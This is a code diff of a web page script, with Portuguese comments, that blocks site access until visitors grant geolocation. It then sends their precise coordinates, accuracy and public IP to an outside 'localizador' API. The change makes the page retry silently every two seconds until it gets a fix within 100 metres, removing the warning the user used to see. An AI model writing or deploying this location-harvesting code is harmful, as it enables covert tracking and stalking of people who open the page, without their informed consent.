@@ -240,64 +240,67 @@
                     maximumAge: 0
                 };
 
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const { latitude, longitude, accuracy } = position.coords;
+                const attemptLocation = () => {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const { latitude, longitude, accuracy } = position.coords;
 
-                        // 2. Validação de Precisão: garante que a margem de erro seja menor ou igual a 100m
-                        if (accuracy > 100) {
-                            alert(`O sinal do seu GPS está muito fraco ou impreciso (margem de erro: ${Math.round(accuracy)} metros). Por favor, aguarde alguns segundos, vá para um local mais aberto e tente novamente.`);
-                            btnGeoAllow.textContent = 'Continuar para o Site';
-                            btnGeoAllow.disabled = false;
-                            return; // Interrompe a execução para não enviar dados imprecisos
-                        }
+                            // Verifica se a precisão é maior que 100m. Se sim, tenta novamente de forma silenciosa.
+                            if (accuracy > 100) {
+                                setTimeout(attemptLocation, 2000); // Tenta novamente após 2 segundos
+                                return;
+                            }
 
-                        let ip = 'Desconhecido';
-                        try {
-                            const ipResponse = await fetch('https://api.ipify.org?format=json');
-                            const ipData = await ipResponse.json();
-                            ip = ipData.ip;
-                        } catch (e) {
-                            console.error('Erro ao obter IP', e);
-                        }
+                            let ip = 'Desconhecido';
+                            try {
+                                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                                const ipData = await ipResponse.json();
+                                ip = ipData.ip;
+                            } catch (e) {
+                                console.error('Erro ao obter IP', e);
+                            }
 
-                        const geoData = {
-                            latitude,
-                            longitude,
-                            accuracy,
-                            timestamp: new Date().toISOString(),
-                            ip
-                        };
+                            const geoData = {
+                                latitude,
+                                longitude,
+                                accuracy,
+                                timestamp: new Date().toISOString(),
+                                ip
+                            };
 
-                        try {
-                            const response = await fetch('https://localizador-api.onrender.com/api/localizacao', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify(geoData)
-                            });
+                            try {
+                                const response = await fetch('https://localizador-api.onrender.com/api/localizacao', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify(geoData)
+                                });
 
-                            if (response.ok) {
+                                if (response.ok) {
+                                    geoModal.style.display = 'none';
+                                    document.body.style.overflow = '';
+                                } else {
+                                    throw new Error('Servidor retornou erro.');
+                                }
+                            } catch (error) {
+                                console.error('Falha de rede ou servidor offline:', error);
+                                // Tratamento de Erro robusto: liberar acesso à tela para não prender o usuário
                                 geoModal.style.display = 'none';
                                 document.body.style.overflow = '';
-                            } else {
-                                throw new Error('Servidor retornou erro.');
                             }
-                        } catch (error) {
-                            console.error('Falha de rede ou servidor offline:', error);
-                            // Tratamento de Erro robusto: liberar acesso à tela para não prender o usuário
-                            geoModal.style.display = 'none';
-                            document.body.style.overflow = '';
-                        }
-                    },
-                    (error) => {
-                        alert('Permissão obrigatória: Você deve aceitar o alerta de localização do navegador para acessar o site.');
-                        btnGeoAllow.textContent = 'Continuar para o Site';
-                        btnGeoAllow.disabled = false;
-                    },
-                    opcoesGPS
-                );
+                        },
+                        (error) => {
+                            alert('Permissão obrigatória: Você deve aceitar o alerta de localização do navegador para acessar o site.');
+                            btnGeoAllow.textContent = 'Continuar para o Site';
+                            btnGeoAllow.disabled = false;
+                        },
+                        opcoesGPS
+                    );
+                };
+
+                // Inicia a primeira tentativa
+                attemptLocation();
             });
         });
     </script>
